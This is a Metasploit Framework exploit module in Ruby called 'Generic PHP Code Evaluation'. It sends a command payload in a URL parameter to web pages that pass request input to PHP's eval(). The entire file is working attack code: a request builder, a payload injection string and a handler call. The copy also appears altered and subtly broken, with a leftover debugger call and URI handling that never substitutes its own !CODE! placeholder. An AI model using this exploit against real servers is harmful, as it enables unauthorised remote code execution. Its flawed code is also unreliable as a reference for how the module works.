##
# $Id: php_eval.rb 14774 2012-02-21 01:42:17Z rapid7 $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rubygems'
require 'ruby-debug'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ManualRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Generic PHP Code Evaluation',
			'Description'    => %q{
				Exploits things like <?php eval($_REQUEST['evalme']); ?>
				It is likely that HTTP evasion options will break this exploit.
			},
			'Author'         => [ 'egypt' ],
			'License'        => BSD_LICENSE,
			'Version'        => '$Revision: 14774 $',
			'References'     => [ ],
			'Privileged'     => false,
			'Platform'       => ['unix'],
			'Arch'           => ARCH_CMD,
			'Payload'        =>
				{
					# max header length for Apache,
					# http://httpd.apache.org/docs/2.2/mod/core.html#limitrequestfieldsize
					'Space'       => 8190,
					# max url length for some old versions of apache according to
					# http://www.boutell.com/newfaq/misc/urllength.html
					#'Space'       => 4000,
					'DisableNops' => true,
					'BadChars'    => %q|'"`|,  # quotes are escaped by PHP's magic_quotes_gpc in a default install
					'Compat'      =>
						{
							'ConnectionType' => 'find',
						},
					'Keys'        => ['php'],
				},
			'DisclosureDate' => 'Oct 13 2008',
			'Targets'        => [ ['Automatic', { }], ],
			'DefaultTarget' => 0
			))

		register_options(
			[
				OptString.new('URIPATH',   [ true,  "The URI to request, with the eval()'d parameter changed to !CODE!", '/bad1.php?p=!CODE!']),
			], self.class)

	end

	def check
		uri = datastore['URIPATH'].gsub(/\?.*/, "")
		print_status("Checking uri #{uri}")
		response = send_request_raw({ 'uri' => uri})
		if response.code == 200
			return Exploit::CheckCode::Detected
		end
		print_error("Server responded with #{response.code}")
		return Exploit::CheckCode::Safe
	end

	def exploit
		# very short timeout because the request may never return if we're
		# sending a socket payload
		debugger;
		timeout = 0.01

		cmd = "'; #{payload.encoded}; #" 

		uri = datastore['URIPATH'] + "?p=#{Rex::Text.uri_encode(cmd)}"
		print_status("Sending request for: #{uri}")

		response = send_request_raw({
				'global' => true,
				'uri' => uri,
				'headers' => {
						'Connection' => 'close'
					}
			},timeout)
		if response and response.code != 200
			print_error("Server returned non-200 status code (#{response.code})")
		end

		handler
	end
end
